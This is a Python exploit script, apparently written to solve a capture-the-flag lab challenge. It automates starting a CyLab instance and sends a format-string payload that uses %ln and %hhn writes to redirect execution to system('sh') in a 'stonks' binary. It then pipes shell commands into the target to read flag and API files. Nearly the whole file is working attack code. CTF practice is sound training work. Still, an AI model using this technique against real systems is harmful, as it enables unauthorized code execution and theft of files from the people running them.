import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

CID = 164
SYSTEM_PLT = 0x4006F0
SH = 0x00006873
PIVOTVAL = 0x00602018
STONK_ARG = 10          # verifie : %s au rang 11 reflechit notre format (user_buf)
RBP_ARG = 12            # [12]=main_rbp, [13]=0x400c66 (retour buy_stonks)


def start_instance():
    cy = CyLab(delay=1.5)
    cy.login()
    cy.req("PUT", f"/api/challenges/{CID}/instance/?source=library")
    for _ in range(12):
        time.sleep(2)
        st, b = cy.req("GET", f"/api/challenges/{CID}/instance/")
        try:
            d = json.loads(b)
        except Exception:
            continue
        txt = re.sub(r"<[^>]+>", "", d.get("description") or "")
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d{2,5})", txt)
        if m and d.get("status") == "RUNNING":
            return m.group(1), int(m.group(2))
    return None, None


def pad(nconv, total):
    if nconv == 1:
        return b"%%%dc" % total
    return b"%c" * (nconv - 1) + b"%%%dc" % (total - (nconv - 1))


def build():
    pivot = RBP_ARG + 8
    p = pad(STONK_ARG - 1, SH) + b"%ln"
    p += pad(RBP_ARG - STONK_ARG - 1, PIVOTVAL - SH) + b"%ln"
    need = (SYSTEM_PLT & 0xFF) - PIVOTVAL % 256
    while need < (pivot - RBP_ARG - 2):
        need += 256
    p += pad(pivot - RBP_ARG - 1, need) + b"%hhn"
    return p


def attempt(n):
    host, port = start_instance()
    if not host:
        print("[%d] instance KO" % n, flush=True)
        return None
    print("[%d] instance %s:%d" % (n, host, port), flush=True)
    payload = build()
    s = socket.create_connection((host, port), timeout=20)
    s.settimeout(2.0)
    time.sleep(0.3)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(b"1\n")
    time.sleep(0.35)
    try:
        s.recv(4096)
    except Exception:
        pass
    # on pipeline les commandes shell : le pty les garde en entree jusqu'a system("sh")
    cmd = b"cat api; cat api.txt; cat flag.txt; cat /app/api; ls -la; echo ENDSHELL\n"
    s.sendall(payload + b"\n" + cmd)
    t0 = time.time()
    total = 0
    last = time.time()
    buf = b""
    while time.time() - t0 < 420:
        try:
            d = s.recv(1 << 20)
        except socket.timeout:
            if time.time() - last > 20:
                break
            continue
        except Exception:
            break
        if not d:
            break
        total += len(d)
        last = time.time()
        buf += d
        if len(buf) > 4 << 20:
            buf = buf[-(2 << 20):]
        if b"ENDSHELL" in buf:
            break
        if b"academy{" in buf:
            break
    s.close()
    dt = time.time() - t0
    print("[%d] %d octets en %.1fs (%.0f Ko/s)" % (n, total, dt, total / 1024 / max(dt, 1)), flush=True)
    txt = buf.decode(errors="replace")
    i = txt.find("academy{")
    if i >= 0:
        flag = txt[i:txt.find("}", i) + 1]
        print("FLAG:", flag, flush=True)
        return flag
    j = txt.find("ENDSHELL")
    if j >= 0:
        print("--- sortie shell ---", flush=True)
        print(txt[max(0, j - 2000):j + 200], flush=True)
    return None


if __name__ == "__main__":
    for i in range(1, 4):
        f = attempt(i)
        if f:
            break
